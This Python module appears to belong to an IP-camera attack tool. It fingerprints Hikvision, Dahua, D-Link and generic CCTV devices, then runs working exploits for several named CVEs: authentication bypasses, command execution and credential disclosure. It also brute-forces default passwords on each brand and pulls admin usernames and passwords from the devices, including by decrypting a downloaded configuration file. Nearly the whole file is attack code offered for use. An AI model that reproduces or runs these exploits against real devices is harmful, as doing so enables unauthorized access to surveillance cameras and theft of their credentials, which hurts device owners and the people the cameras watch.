"""Vulnerability Exploition"""
import os
import sys
import json
import time
import hashlib
import requests

CWD = os.path.dirname(__file__)
sys.path.append(os.path.join(CWD, '..'))
from utils.net import get_user_agent
from utils.config import USERS, PASSWORDS, TIMEOUT, DEBUG


#======================== global vars ========================
DEV_HASH = {
    '4ff53be6165e430af41d782e00207fda': 'dahua',
    '89b932fcc47cf4ca3faadb0cfdef89cf': 'hikvision',
    'f066b751b858f75ef46536f5b357972b': 'cctv'
}
#=============================================================


def device_type(ip: str) -> list:
    """Check whether the ip is a web camera"""
    url_list = [
        f"http://{ip}/favicon.ico",  # hikvision, cctv
        f"http://{ip}/image/lgbg.jpg",  # Dahua
        f"http://{ip}",  # dlink
    ]
    try:
        r = requests.get(url_list[0], timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            hash_val = hashlib.md5(r.content).hexdigest()
            if hash_val in DEV_HASH: return DEV_HASH[hash_val]
    except: pass
    try:
        r = requests.get(url_list[1], timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            hash_val = hashlib.md5(r.content).hexdigest()
            if hash_val in DEV_HASH: return DEV_HASH[hash_val]
    except: pass
    try:
        r = requests.get(url_list[2], timeout=TIMEOUT, verify=False)
        if 'realm="DCS' in str(r.headers): return 'dlink'
    except: pass

    return 'unidentified'


def cve_2021_36260(ip: str) -> list:
    """(Hikvision) Arbitrary command execution vulnerability"""
    if ':' in ip:
        items = ip.split(':')
        ip, port = items
    else: port = 80
    cve_lib = os.path.join(CWD, 'lib/CVE-2021-36260.py')
    res = os.popen(f"python3 {cve_lib} --rhost {ip} --rport {port} --cmd 'pwd'").readlines()[-2].strip()
    return [res == '/home', '', '', 'Hikvision', 'cve-2021-36260']


def cve_2017_7921(ip: str) -> list:
    """(Hikvision) Bypassing authentication vulnerability"""
    headers = {'User-Agent': get_user_agent()}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"

    r = requests.get(user_url, timeout=TIMEOUT, verify=False, headers=headers)
    if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
        rc = requests.get(config_url, timeout=TIMEOUT * 2, verify=False, headers=headers)
        with open(f"{ip}-config", 'wb') as f:
            f.write(rc.content)
        decryptor = os.path.join(CWD, 'lib/decrypt_configure.py')
        info = eval(os.popen(f"python3 {decryptor} {ip}-config").readline().strip())
        idx = - info[::-1].index('admin')
        user, passwd = info[idx - 1], info[idx]
        os.remove(f"{ip}-config")
        return [True, str(user), str(passwd), 'Hikvision', 'cve-2017-7921']
    return [False, ]


def hik_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
    """(Hikvision) Brute"""
    passwords = set(passwords + ['12345', '888888'])
    headers = {'User-Agent': get_user_agent()}
    for user in users:
        for p in passwords:
            r = requests.get(f"http://{ip}/ISAPI/Security/userCheck", auth=(user, p), timeout=TIMEOUT, verify=False, headers=headers)
            if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                return [True, str(user), str(p), 'Hikvision', 'weak pass']
    return [False, ]


def dahua_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
    """(Dahua) Brute"""
    passwords = set(passwords + ['admin'])
    headers = {
        'User-Agent': get_user_agent(),
        'Host': ip.split(':')[0],
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    for user in users:
        for p in passwords:
            _json = {
                "method": "global.login",
                "params": {
                    "userName": user,
                    "password": p,
                    "clientType": "Web3.0",
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "passwordType": "Plain",
                },
                "id": 1,
                "session": 0,
            }
            r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=TIMEOUT)
            if r.status_code == 200 and r.json()['result'] == True:
                return [True, str(user), str(p), 'Dahua', 'weak pass']
    return [False, ]


def cve_2021_33044(ip: str) -> list:
    """(Dahua) Bypassing authentication vulnerability"""
    headers = {
        'User-Agent': get_user_agent(),
        'Host': ip.split(':')[0],
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    _json = {
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "Not Used",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default",
        },
        "id": 1,
        "session": 0,
    }
    r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=TIMEOUT)
    if r.status_code == 200 and r.json()['result'] == True:
        if ':' in ip: ip, port = ip.split(':')
        else: port = 80

        def dh_console(proto='dhip'):
            console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
            user, passwd = '', ''
            try:
                with os.popen(f"""
                (
                    echo "OnvifUser -u"
                    echo "quit all"
                ) | python3 -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto} 2>/dev/null
                """) as f: items = [line.strip() for line in f]
                for idx, val in enumerate(items):
                    if 'Name' in val:
                        user = val.split(':')[-1].strip().strip(',').replace('"', '') 
                        passwd = items[idx + 1].split(':')[-1].strip().strip(',').replace('"', '')
                        break
            except Exception as e:
                if DEBUG: print(e)
            return user, passwd

        # firstly, try the dhip
        user, passwd = dh_console(proto='dhip')

        # if not successed, try the http
        if not user and not passwd:
            user, passwd = dh_console(proto='http')

        return [True, user, passwd, 'Dahua', 'cve-2021-33044']
    return [False, ]


def cve_2021_33045(ip: str) -> list:
    """(Dahua NVR) Bypassing authentication vulnerability"""
    if ':' in ip: ip, port = ip.split(':')
    else: port = 80
    console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
    json_file = f"{ip}-{port}-users.json"

    with os.popen(f"""
    (
        echo "config RemoteDevice save {json_file}"
        echo "quit all"
    ) | python3 -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
    """) as f: items = f.readlines()
    # print(''.join(items))

    # success
    if os.path.exists(json_file):
        with open(json_file, 'r') as f:
            info = json.load(f)
        dev_all = info['params']['table'].values()
        dev_alive = [i for i in dev_all if i['Enable']]
        user = dev_alive[0]['UserName']
        passwd = dev_alive[0]['Password']
        os.remove(json_file)
        return [True, user, passwd, f"Dahua-{len(dev_alive)}", 'cve-2021-33045']
    # fail
    else:
        return [False, ]


def cve_2020_25078(ip: str) -> list:
    """(DLink) Disclosure of sensitive information"""
    headers = {'User-Agent': get_user_agent()}
    r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=TIMEOUT, verify=False, headers=headers)
    if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
        items = r.text.split()
        user, passwd = items[0].split('=')[1], items[1].split('=')[1]
        return [True, str(user), str(passwd), 'DLink', 'cve-2020-25078']
    return [False, ]


# bug!!!
def dlink_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
    """(DLink) Brute"""
    passwords = set(passwords + [''])
    headers = {'User-Agent': get_user_agent()}
    for user in users:
        for p in passwords:
            r = requests.get(f"http://{ip}", verify=False, headers=headers, timeout=TIMEOUT, auth=(user, p))
            if r.status_code == 200 and 'D-Link' in r.text:
                return [True, str(user), str(p), 'DLink', 'weak pass']
    return [False, ]


def cctv_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
    """(CCTV) Brute"""
    passwords = set(passwords + [''])
    headers = {'User-Agent': get_user_agent()}
    for user in users:
        for p in passwords:
            url = f'http://{ip}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{p}"><config base=""/><playback base=""/></rpermission></juan>'
            r = requests.get(url, headers=headers, verify=False, timeout=TIMEOUT)
            if r.status_code == 200 and '<rpermission' in r.text:
                items = r.text.split()
                idx = items.index('<rpermission')
                if '0' in items[idx + 1]:
                    return [True, str(user), str(p), 'CCTV', 'weak pass']
    return [False, ]


modules = {
    'device_type': device_type,

    # hikvision
    'hik_weak': hik_weak,
    'cve_2021_36260': cve_2021_36260,
    'cve_2017_7921': cve_2017_7921,

    # dahua
    'dahua_weak': dahua_weak,
    'cve_2021_33044': cve_2021_33044,
    'cve_2021_33045': cve_2021_33045,

    # cctv
    'cctv_weak': cctv_weak,

    # dlink
    'cve_2020_25078': cve_2020_25078,
}


if __name__ == '__main__':
    #  print(cve_2021_36260('10.101.35.74'))
    print(dahua_weak('172.17.211.3'))
